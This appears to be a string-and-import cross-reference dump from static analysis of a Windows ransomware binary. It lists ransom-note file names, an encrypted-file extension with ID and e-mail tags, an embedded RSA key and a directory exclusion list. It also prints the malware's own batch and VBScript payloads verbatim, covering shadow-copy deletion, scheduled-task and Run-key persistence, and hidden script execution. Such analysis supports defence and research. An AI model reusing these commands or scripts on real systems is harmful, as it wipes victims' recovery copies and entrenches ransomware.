reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x404743	0x4c9044	import	0x4046b0	KERNEL32.dll.CloseHandle
0x404853	0x4c9040	import	0x4047a0	KERNEL32.dll.WaitForSingleObjectEx
0x404949	0x4c90a0	import	0x4047a0	KERNEL32.dll.ReleaseSemaphore
0x404962	0x47a66b	string	0x4047a0	;\r$!P
0x404f42	0x4dde78	string	0x404f10	NameValuePairs: type mismatch for '
0x404f62	0x4dde6c	string	0x404f10	', stored '
0x404ff3	0x4dde54	string	0x404f10	', trying to retrieve '
0x405555	0x4dde9c	string	0x405530	Clone() is not implemented yet.
0x40562c	0x4ddebc	string	0x405620	unknown
0x405705	0x4ddec8	string	0x4056d0	: this object doesn't support resynchronization
0x405795	0x4ddef8	string	0x405770	StreamTransformation: this object doesn't support random access
0x405935	0x4ddf38	string	0x405910	RandomNumberGenerator: IncorporateEntropy not implemented
0x4059e5	0x4ddf74	string	0x4059c0	BufferedTransformation: this object is not attachable
0x405b35	0x4ddfe0	string	0x405b10	CryptoMaterial: this object does not support precomputation
0x405cb5	0x4de020	string	0x405c90	GeneratableCryptoMaterial: this object does not support key/parameter generation
0x405e3b	0x4de080	string	0x405df0	AlgorithmParametersBase: parameter "
0x405e97	0x4de074	string	0x405df0	" not used
0x4065ba	0x4de0a8	string	0x406500	InputBuffer
0x40665c	0x4de0a8	string	0x406500	InputBuffer
0x4068e6	0x4de0c4	string	0x4068e0	EncodingParameters
0x407010	0x47a66b	string	0x406e20	;\r$!P
0x4072a2	0x4de1b0	string	0x407260	CipherModeBase: feedback size cannot be specified for this cipher mode
0x407408	0x4de1fc	string	0x4073d0	/GCM
0x407646	0x4de208	string	0x4075c0	empty
0x40769a	0x47a66b	string	0x4075c0	;\r$!P
0x407919	0x4c9018	import	0x4078c0	KERNEL32.dll.SetErrorMode
0x407e4f	0x47a66b	string	0x4078c0	;\r$!P
0x4084a9	0x4c9018	import	0x408450	KERNEL32.dll.SetErrorMode
0x408ab5	0x47a66b	string	0x408450	;\r$!P
0x408b39	0x4c9018	import	0x408ae0	KERNEL32.dll.SetErrorMode
0x40904c	0x47a66b	string	0x408ae0	;\r$!P
0x4093e7	0x4de210	string	0x409070	nqpso5938fh71jfu
0x4098fb	0x47a66b	string	0x409070	;\r$!P
0x4099ca	0x47a66b	string	0x409920	;\r$!P
0x409a1d	0x47a66b	string	0x409920	;\r$!P
0x409ca0	0x4de290	string	0x409bf0	GET /
0x409cba	0x4de27c	string	0x409bf0	HTTP/1.1\r\nHost:
0x409d2c	0x4de264	string	0x409bf0	\r\nConnection: close\r\n\r\n
0x409f1a	0x4c929c	import	0x409bf0	WS2_32.dll.WSAStartup
0x409f3a	0x4c9294	import	0x409bf0	WS2_32.dll.socket
0x409f52	0x4c92a4	import	0x409bf0	WS2_32.dll.gethostbyname
0x409f5f	0x4c92b4	import	0x409bf0	WS2_32.dll.htons
0x409f94	0x4c92a0	import	0x409bf0	WS2_32.dll.connect
0x409ff9	0x4c9298	import	0x409bf0	WS2_32.dll.send
0x40a024	0x4c92b0	import	0x409bf0	WS2_32.dll.recv
0x40a0a3	0x4c92b0	import	0x409bf0	WS2_32.dll.recv
0x40a0ae	0x4c92a8	import	0x409bf0	WS2_32.dll.closesocket
0x40a0b4	0x4c92ac	import	0x409bf0	WS2_32.dll.WSACleanup
0x40a1c8	0x47a66b	string	0x409bf0	;\r$!P
0x40a284	0x4de2a8	string	0x40a1e0	slow
0x40a42d	0x4de2e8	string	0x40a1e0	:\Users\
0x40a5ab	0x4de2fc	string	0x40a1e0	Desktopini.exe
0x40a734	0x4de31c	string	0x40a1e0	a5m6f
0x40a757	0x4de31c	string	0x40a1e0	a5m6f
0x40a777	0x4de328	string	0x40a1e0	kaj3n
0x40a96c	0x4de338	string	0x40a1e0	"%SystemDrive%\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
0x40a996	0x4de3f8	string	0x40a1e0	"%SystemDrive%\Users\%username%\Desktop\
0x40a9cc	0x4de450	string	0x40a1e0	"%SystemDrive%\Documents and Settings\%username%\Desktop\
0x40a9db	0x4de4c8	string	0x40a1e0	"%SystemDrive%\Documents and Settings\%username%\Start Menu\Programs\Startup\
0x40a9fe	0x4de2fc	string	0x40a1e0	Desktopini.exe
0x40aa1e	0x4de564	string	0x40a1e0	rem a5m6f
0x40aa34	0x4de328	string	0x40a1e0	kaj3n
0x40ab07	0x4dec78	string	0x40a1e0	@echo off\r\ntasklist /v | find /I /c "dcdcf" > nul\r\nif "%ERRORLEVEL%" == "0" goto ErrorAlreadyRunning\r\nset lend=deb\r\nvssadmin.exe Delete Shadows /All /Quiet\r\ntitle dcdcf\r\ngoto notend\r\n:ErrorAlreadyRunning\r\nexit\r\n:secthree\r\ntasklist /fi "ImageName eq
0x40ab1d	0x4deb20	string	0x40a1e0	" /fo csv 2>NUL | find /I "
0x40abc9	0x4debb0	string	0x40a1e0	">NUL\r\nif "%ERRORLEVEL%"=="0" goto imer\r\nif %lend% == bed (goto akakak)\r\nset lend=bed\r\nIF EXIST
0x40ac83	0x4de998	string	0x40a1e0	Desktopini.exe" (\r\nstart /d
0x40ad29	0x4de974	string	0x40a1e0	" Desktopini.exe
0x40addf	0x4deb58	string	0x40a1e0	\r\n)\r\n:secttwo\r\ntasklist /fi "ImageName eq
0x40ae8f	0x4deb20	string	0x40a1e0	" /fo csv 2>NUL | find /I "
0x40af3f	0x4dea48	string	0x40a1e0	">NUL\r\nif "%ERRORLEVEL%"=="0" goto notend\r\ngoto secton\r\n:notend\r\ntimeout /t 15 /nobreak >NUL\r\nIF NOT EXIST
0x40afef	0x4de9d8	string	0x40a1e0	ReadMe_Now!.hta" (\r\ngoto secttwo\r\n:secton\r\nIF EXIST
0x40b09f	0x4de998	string	0x40a1e0	Desktopini.exe" (\r\nstart /d
0x40b153	0x4de974	string	0x40a1e0	" Desktopini.exe
0x40b205	0x4de94c	string	0x40a1e0	\r\n)\r\nIF NOT EXIST
0x40b2b5	0x4de910	string	0x40a1e0	Desktopini.exe" (\r\nIF EXIST "
0x40b633	0x4de858	string	0x40a1e0	\r\n)\r\n)\r\ngoto notend\r\n)\r\n:imer\r\ntimeout /t 90 /nobreak >NUL\r\nIF EXIST
0x40b6d3	0x4de7f8	string	0x40a1e0	ReadMe_Now!.hta" (\r\ngoto secthree\r\n)\r\n:akakak\r\n
0x40b73e	0x4de578	string	0x40a1e0	\r\nschtasks /delete /tn Microsoft_Auto_Scheduler /f\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" /f\r\n)\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" (\r\nDEL "%SystemDrive%\Users\%username%\AppData\t2_svc.bat" /f\r\n)\r\nDEL "%~f0" /f
0x40b934	0x4de2e8	string	0x40a1e0	:\Users\
0x40b95c	0x4dee6c	string	0x40a1e0	\AppData\v9_svc.vbs
0x40b98f	0x4dee98	string	0x40a1e0	Dim strScript\r\nDim oExec, oWshShell\r\nDim ComSpec\r\nSet oWshShell = CreateObject("WScript.Shell")\r\nComSpec = oWshShell.ExpandEnvironmentStrings("%comspec%")\r\nstrScript = ComSpec & " /C echo %SystemDrive%\Users\%username%\AppData\h4_svc.bat"\r\nSet oExec = oWshShell.Exec (strScript)\r\nDim outputsxc\r\noutputsxc = oExec.StdOut.ReadAll()\r\nSet fso = CreateObject("Scripting.FileSystemObject")\r\noutputsxc = Replace(outputsxc, vbCr, "")\r\noutputsxc = Replace(outputsxc, vbLf, "")\r\nIf (fso.FileExists(outputsxc)) Then\r\nSet WinScriptHost = CreateObject("WScript.Shell")\r\nWinScriptHost.Run Chr(34) & "%SystemDrive%\Users\%username%\AppData\h4_svc.bat" & Chr(34), 0\r\nSet WinScriptHost = Nothing\r\nEnd If
0x40b9e8	0x4de2e8	string	0x40a1e0	:\Users\
0x40ba10	0x4df148	string	0x40a1e0	\AppData\t2_svc.bat
0x40ba43	0x4df170	string	0x40a1e0	@echo off\r\nIF EXIST "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs" (\r\nstart "" "%SystemDrive%\Users\%username%\AppData\v9_svc.vbs"\r\n)
0x40ba9c	0x4df1fc	string	0x40a1e0	cd "%SystemDrive%\Users\%username%\AppData\"&t2_svc.bat
0x40baaf	0x4df238	string	0x40a1e0	schtasks /create /sc minute /mo 6 /tn "Microsoft_Auto_Scheduler" /tr "'C:\Users\%username%\AppData\t2_svc.bat'" /f
0x40bb9e	0x47a66b	string	0x40a1e0	;\r$!P
0x40bdef	0x4c90ac	import	0x40bd90	KERNEL32.dll.FindFirstFileW
0x40bf04	0x4c90a4	import	0x40bd90	KERNEL32.dll.FindNextFileW
0x40c049	0x47a66b	string	0x40bd90	;\r$!P
0x40c0bd	0x4df2ac	string	0x40c060	udij=
0x40c27b	0x4df2cc	string	0x40c060	d7j3
0x40c28e	0x4df2c4	string	0x40c060	y9a0
0x40c2f6	0x4df2bc	string	0x40c060	m5ha
0x40cadc	0x47a66b	string	0x40c060	;\r$!P
0x40cc56	0x4e29b4	string	0x40cba0	_Enc
0x40cc7c	0x4e29c0	string	0x40cba0	[ID=
0x40ccdb	0x4e29cc	string	0x40cba0	-Mail=
0x40ccf3	0x4e2a50	string	0x40cba0	\Documents and Settings\
0x40cd85	0x4e29e0	string	0x40cba0	\Local Settings\Application Data\Microsoft\Credentials
0x40ce08	0x40ce56	string	0x40cba0	hP*N
0x40ce17	0x40ce56	string	0x40cba0	hP*N
0x40ce56	0x4e2a50	string	0x40cba0	\Documents and Settings\
0x40ceeb	0x4e2a88	string	0x40cba0	\Application Data\Microsoft\Credentials
0x40cfa3	0x4e2ad8	string	0x40cba0	\Users\All Users\Microsoft\Windows\Caches
0x40cff9	0x40d028	string	0x40cba0	h,+N
0x40d00c	0x40d028	string	0x40cba0	h,+N
0x40d028	0x4e2b2c	string	0x40cba0	\ProgramData
0x40d07e	0x40d0b3	string	0x40cba0	hH+N
0x40d097	0x40d0b3	string	0x40cba0	hH+N
0x40d0b3	0x4e2b48	string	0x40cba0	\Recovery
0x40d109	0x40d138	string	0x40cba0	h\+N
0x40d11c	0x40d138	string	0x40cba0	h\+N
0x40d138	0x4e2b5c	string	0x40cba0	\ProgramData\Microsoft
0x40d1c3	0x4e2b8c	string	0x40cba0	\Windows
0x40d219	0x40d248	string	0x40cba0	hP*N
0x40d22c	0x40d248	string	0x40cba0	hP*N
0x40d248	0x4e2a50	string	0x40cba0	\Documents and Settings\
0x40d2dd	0x4e2ba0	string	0x40cba0	\Local Settings\Temporary Internet Files
0x40d360	0x40d393	string	0x40cba0	hP*N
0x40d377	0x40d393	string	0x40cba0	hP*N
0x40d393	0x4e2a50	string	0x40cba0	\Documents and Settings\
0x40d428	0x4e2bf4	string	0x40cba0	\Start Menu
0x40d4da	0x4e2c10	string	0x40cba0	\Documents and Settings\All Users\Start Menu
0x40d530	0x40d563	string	0x40cba0	hl,N
0x40d547	0x40d563	string	0x40cba0	hl,N
0x40d563	0x4e2c6c	string	0x40cba0	\WINDOWS
0x40d5e8	0x4e2c80	string	0x40cba0	\Boot
0x40d673	0x4e2c8c	string	0x40cba0	\$RECYCLE.BIN
0x40d6f5	0x4e2ca8	string	0x40cba0	\System Volume Information
0x40e28e	0x4e2ce0	string	0x40cba0	f__d_d.sys
0x40e2dd	0x4e2cf8	string	0x40cba0	t2_svc.bat
0x40e32c	0x4e2d10	string	0x40cba0	v9_svc.vbs
0x40e37b	0x4e2d28	string	0x40cba0	h4_svc.bat
0x40e3ca	0x4e2d40	string	0x40cba0	Renc.sys
0x40e419	0x4e2d54	string	0x40cba0	ReadMe_Now!.hta
0x40e468	0x4e2d74	string	0x40cba0	io.sys
0x40e4b8	0x4e2d84	string	0x40cba0	ntdetect.com
0x40e508	0x4e2da0	string	0x40cba0	ntldr
0x40e558	0x4e2dac	string	0x40cba0	RCRU_64.exe
0x40e5a8	0x4e2dc4	string	0x40cba0	bootfont.bin
0x40e5f8	0x4e2de0	string	0x40cba0	Read_Me!_.txt
0x40e648	0x4de2fc	string	0x40cba0	Desktopini.exe
0x40e698	0x4e2dfc	string	0x40cba0	bootmgr
0x40e6e8	0x4e2e0c	string	0x40cba0	Pagesfilo.sys
0x40e738	0x4e2e28	string	0x40cba0	desktop.ini
0x40e788	0x4e2e40	string	0x40cba0	BOOTSECT.BAK
0x40e7df	0x4e2e5c	string	0x40cba0	boot.ini
0x40eeb8	0x4e29c0	string	0x40cba0	[ID=
0x40ef3e	0x4e29cc	string	0x40cba0	-Mail=
0x40f69c	0x4e29c0	string	0x40cba0	[ID=
0x40f6bb	0x4e29b4	string	0x40cba0	_Enc
0x40f748	0x4e29b4	string	0x40cba0	_Enc
0x40f9e1	0x47a66b	string	0x40cba0	;\r$!P
0x40fa3e	0x4de2e8	string	0x40fa00	:\Users\
0x40fcb7	0x4c9024	import	0x40fa00	KERNEL32.dll.GetFileAttributesW
0x40fcc2	0x4c90b4	import	0x40fa00	KERNEL32.dll.CreateDirectoryW
0x40fd01	0x4c9024	import	0x40fa00	KERNEL32.dll.GetFileAttributesW
0x40fd0f	0x4c90b4	import	0x40fa00	KERNEL32.dll.CreateDirectoryW
0x40fd1b	0x4c90b4	import	0x40fa00	KERNEL32.dll.CreateDirectoryW
0x40fd2a	0x4c90b4	import	0x40fa00	KERNEL32.dll.CreateDirectoryW
0x40fd31	0x4c9024	import	0x40fa00	KERNEL32.dll.GetFileAttributesW
0x40febd	0x47a66b	string	0x40fa00	;\r$!P
0x40ff37	0x4c9028	import	0x40fee0	KERNEL32.dll.GetSystemDirectoryW
0x41002c	0x47a66b	string	0x40fee0	;\r$!P
0x4100c1	0x4c902c	import	0x410040	KERNEL32.dll.GetComputerNameExW
0x410160	0x4c9260	import	0x410040	NETAPI32.dll.DsRoleGetPrimaryDomainInformation
0x41016c	0x4e2e8c	string	0x410040	Empty
0x4101b1	0x4e2e8c	string	0x410040	Empty
0x410662	0x47a66b	string	0x410040	;\r$!P
0x41073e	0x4e2ea0	string	0x410680	MIIBoDANBgkqhkiG9w0BAQEFAAOCAY0AMIIBiAKCAYEAvaM2Ua4pHP8HGmZPaHrRFJomoH2c/4Ysc3XdG9WnWW1K23qOPhyQFHNzG2hUdhLynlwGsqapcC1inwu9cVh+oh5p8PR486FMdXCWUm+WfFNNw0xGWBejd8CIHdBl0eHPT0X3XYGpFLV7xg2NiYe551ff1m4tsYZ9ZQqOEA/GpxXG76BZFPRAuz/ySNbnskKx3gxGuq55vh/qjCFLixUmUnB/tv3lkrdExF7D6ItrKdvuWFrs8B39CdpwvtAfjNJGOiTK2EmvlcRgNBlO+5C4Mz1hGSGCnbBFsW6vL9wZEjg1WM2+qxqfY79dk15OAfgKWD2St/IxUTNNwnZJqlUPyZ+yCwsprxjpFsfNSRXmJpS8pqv81H2rZua6B0e0R4dZnfJq0F0f0FZzZ4FTsobO/w3Ze+BWFr5iY+eaLoXKk8CfUuLNq8SnMrK3SNHDXnY+wLuh0z8qp6w8eUp+nAYUMIYwSdWRX2/LyaGAG7Ar1Khn1ZRP8gv4D7XM7DbGvqqLAgER
0x410a7e	0x4e30d4	string	0x410680	J7x23
0x410cd8	0x47a66b	string	0x410680	;\r$!P
0x410d2d	0x4c9054	import	0x410d00	KERNEL32.dll.GlobalMemoryStatusEx
0x410dcd	0x47a66b	string	0x410d00	;\r$!P
0x410e45	0x4c9264	import	0x410de0	NETAPI32.dll.NetUserEnum
0x410edf	0x4c9268	import	0x410de0	NETAPI32.dll.NetApiBufferFree
0x410eef	0x4c9268	import	0x410de0	NETAPI32.dll.NetApiBufferFree
0x410f30	0x47a66b	string	0x410de0	;\r$!P
0x411a42	0x47a66b	string	0x410f40	;\r$!P
0x411ac7	0x4c928c	import	0x411a80	USER32.dll.GetWindowTextLengthA
0x411b99	0x4c9284	import	0x411a80	USER32.dll.GetWindowTextA
0x411e84	0x47a66b	string	0x411a80	;\r$!P
0x411f98	0x4c9278	import	0x411f60	SHLWAPI.dll.PathIsNetworkPathA
0x411fe2	0x4c9030	import	0x411f60	KERNEL32.dll.MultiByteToWideChar
0x412003	0x4c903c	import	0x411f60	KERNEL32.dll.GetDiskFreeSpaceExW
0x412053	0x47a66b	string	0x411f60	;\r$!P
0x412072	0x47a66b	string	0x411f60	;\r$!P
0x41209c	0x4e310c	string	0x412080	GetLogicalProcessorInformation
0x4120a1	0x4e312c	string	0x412080	kernel32
0x4120ba	0x4c90b0	import	0x412080	KERNEL32.dll.GetModuleHandleW
0x4120c1	0x4c904c	import	0x412080	KERNEL32.dll.GetProcAddress
0x4120cf	0x4e3140	string	0x412080	\nGetLogicalProcessorInformation is not supported.\n
0x4120e4	0x47a66b	string	0x412080	;\r$!P
0x4120ed	0x4c9034	import	0x412080	KERNEL32.dll.GetLastError
0x41212d	0x4e31a8	string	0x412080	\nError: Allocation failure\n
0x412142	0x47a66b	string	0x412080	;\r$!P
0x41214e	0x4e31e0	string	0x412080	\nError %d\n
0x412163	0x47a66b	string	0x412080	;\r$!P
0x41234b	0x47a66b	string	0x412080	;\r$!P
0x41238a	0x47a66b	string	0x412080	;\r$!P
0x4123bf	0x4c9054	import	0x4123a0	KERNEL32.dll.GlobalMemoryStatusEx
0x41240f	0x47a66b	string	0x4123a0	;\r$!P
0x412423	0x47a66b	string	0x4123a0	;\r$!P
0x412437	0x47a66b	string	0x4123a0	;\r$!P
0x41244b	0x47a66b	string	0x4123a0	;\r$!P
0x41245f	0x47a66b	string	0x4123a0	;\r$!P
0x4124e3	0x4e31f8	string	0x4124a0	Address:
0x4125d2	0x47a66b	string	0x4124a0	;\r$!P
0x4129d1	0x4c9018	import	0x412990	KERNEL32.dll.SetErrorMode
0x412a80	0x4c9030	import	0x412990	KERNEL32.dll.MultiByteToWideChar
0x412a9d	0x4c903c	import	0x412990	KERNEL32.dll.GetDiskFreeSpaceExW
0x412aa4	0x4c9078	import	0x412990	KERNEL32.dll.GetDriveTypeW
0x412bcd	0x4c90ac	import	0x412990	KERNEL32.dll.FindFirstFileW
0x412c03	0x4e32f0	string	0x412990	\Read_Me!_.txt
0x412cb9	0x4e32f0	string	0x412990	\Read_Me!_.txt
0x412e3e	0x4c90a4	import	0x412990	KERNEL32.dll.FindNextFileW
0x412e64	0x4e2a50	string	0x412990	\Documents and Settings\
0x412f01	0x4e29e0	string	0x412990	\Local Settings\Application Data\Microsoft\Credentials
0x412f95	0x412fe7	string	0x412990	hP*N
0x412fa7	0x412fe7	string	0x412990	hP*N
0x412fe7	0x4e2a50	string	0x412990	\Documents and Settings\
0x41308e	0x4e2a88	string	0x412990	\Application Data\Microsoft\Credentials
0x413153	0x4e2ad8	string	0x412990	\Users\All Users\Microsoft\Windows\Caches
0x4131ae	0x4131e3	string	0x412990	h,+N
0x4131c7	0x4131e3	string	0x412990	h,+N
0x4131e3	0x4e2b2c	string	0x412990	\ProgramData
0x413240	0x413273	string	0x412990	hH+N
0x413257	0x413273	string	0x412990	hH+N
0x413273	0x4e2b48	string	0x412990	\Recovery
0x4132d0	0x413303	string	0x412990	h\+N
0x4132e7	0x413303	string	0x412990	h\+N
0x413303	0x4e2b5c	string	0x412990	\ProgramData\Microsoft
0x413393	0x4e2b8c	string	0x412990	\Windows
0x4133f6	0x413425	string	0x412990	hP*N
0x413409	0x413425	string	0x412990	hP*N
0x413425	0x4e2a50	string	0x412990	\Documents and Settings\
0x4134cf	0x4e2ba0	string	0x412990	\Local Settings\Temporary Internet Files
0x413563	0x413593	string	0x412990	hP*N
0x413577	0x413593	string	0x412990	hP*N
0x413593	0x4e2a50	string	0x412990	\Documents and Settings\
0x41363d	0x4e2bf4	string	0x412990	\Start Menu
0x4136fa	0x4e2c10	string	0x412990	\Documents and Settings\All Users\Start Menu
0x413757	0x413786	string	0x412990	hl,N
0x41376a	0x413786	string	0x412990	hl,N
0x413786	0x4e2c6c	string	0x412990	\WINDOWS
0x413813	0x4e2c80	string	0x412990	\Boot
0x4138a3	0x4e2c8c	string	0x412990	\$RECYCLE.BIN
0x413933	0x4e2ca8	string	0x412990	\System Volume Information
0x414435	0x4c9008	import	0x412990	ADVAPI32.dll.GetNamedSecurityInfoW
0x414499	0x4c9070	import	0x412990	KERNEL32.dll.lstrcmpW
0x4144c7	0x4e32f0	string	0x412990	\Read_Me!_.txt
0x41469d	0x4c9058	import	0x412990	KERNEL32.dll.GetModuleFileNameW
0x4146f2	0x4e331c	string	0x412990	\RCRU_64.exe
0x41477b	0x4c905c	import	0x412990	KERNEL32.dll.CopyFileW
0x414786	0x4e3338	string	0x412990	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x4147d5	0x4e3460	string	0x412990	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x4147e9	0x4e33f0	string	0x412990	/f&reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
0x414dd5	0x4c9024	import	0x412990	KERNEL32.dll.GetFileAttributesW
0x414ea6	0x4e29c0	string	0x412990	[ID=
0x4150e8	0x4c9020	import	0x412990	KERNEL32.dll.FindClose
0x41512d	0x47a66b	string	0x412990	;\r$!P
0x4151b5	0x4c9018	import	0x415170	KERNEL32.dll.SetErrorMode
0x415260	0x4c9030	import	0x415170	KERNEL32.dll.MultiByteToWideChar
0x41527d	0x4c903c	import	0x415170	KERNEL32.dll.GetDiskFreeSpaceExW
0x415284	0x4c9078	import	0x415170	KERNEL32.dll.GetDriveTypeW
0x4153ad	0x4c90ac	import	0x415170	KERNEL32.dll.FindFirstFileW
0x4154d2	0x4e32f0	string	0x415170	\Read_Me!_.txt
0x415588	0x4e32f0	string	0x415170	\Read_Me!_.txt
0x415a78	0x4e2a50	string	0x415170	\Documents and Settings\
0x415b15	0x4e29e0	string	0x415170	\Local Settings\Application Data\Microsoft\Credentials
0x415ba9	0x415bf8	string	0x415170	hP*N
0x415bb8	0x415bf8	string	0x415170	hP*N
0x415bf8	0x4e2a50	string	0x415170	\Documents and Settings\
0x415c9f	0x4e2a88	string	0x415170	\Application Data\Microsoft\Credentials
0x415d63	0x4e2ad8	string	0x415170	\Users\All Users\Microsoft\Windows\Caches
0x415dbe	0x415df3	string	0x415170	h,+N
0x415dd7	0x415df3	string	0x415170	h,+N
0x415df3	0x4e2b2c	string	0x415170	\ProgramData
0x415e50	0x415e83	string	0x415170	hH+N
0x415e67	0x415e83	string	0x415170	hH+N
0x415e83	0x4e2b48	string	0x415170	\Recovery
0x415ee0	0x415f13	string	0x415170	h\+N
0x415ef7	0x415f13	string	0x415170	h\+N
0x415f13	0x4e2b5c	string	0x415170	\ProgramData\Microsoft
0x415fa3	0x4e2b8c	string	0x415170	\Windows
0x416006	0x416035	string	0x415170	hP*N
0x416019	0x416035	string	0x415170	hP*N
0x416035	0x4e2a50	string	0x415170	\Documents and Settings\
0x4160df	0x4e2ba0	string	0x415170	\Local Settings\Temporary Internet Files
0x416173	0x4161a3	string	0x415170	hP*N
0x416187	0x4161a3	string	0x415170	hP*N
0x4161a3	0x4e2a50	string	0x415170	\Documents and Settings\
0x41624d	0x4e2bf4	string	0x415170	\Start Menu
0x41630a	0x4e2c10	string	0x415170	\Documents and Settings\All Users\Start Menu
0x416367	0x416396	string	0x415170	hl,N
0x41637a	0x416396	string	0x415170	hl,N
0x416396	0x4e2c6c	string	0x415170	\WINDOWS
0x416423	0x4e2c80	string	0x415170	\Boot
0x4164b3	0x4e2c8c	string	0x415170	\$RECYCLE.BIN
0x416543	0x4e2ca8	string	0x415170	\System Volume Information
0x417016	0x4c90a4	import	0x415170	KERNEL32.dll.FindNextFileW
0x417025	0x4c9020	import	0x415170	KERNEL32.dll.FindClose
0x41711d	0x4c9008	import	0x415170	ADVAPI32.dll.GetNamedSecurityInfoW
0x417139	0x4c9070	import	0x415170	KERNEL32.dll.lstrcmpW
0x41718c	0x4e32f0	string	0x415170	\Read_Me!_.txt
0x417245	0x4e32f0	string	0x415170	\Read_Me!_.txt
0x41741d	0x4c9058	import	0x415170	KERNEL32.dll.GetModuleFileNameW
0x417472	0x4e331c	string	0x415170	\RCRU_64.exe
0x4174fb	0x4c905c	import	0x415170	KERNEL32.dll.CopyFileW
0x417506	0x4e3338	string	0x415170	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f&reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /f
0x417555	0x4e3460	string	0x415170	reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Machin_Update /t REG_SZ /d
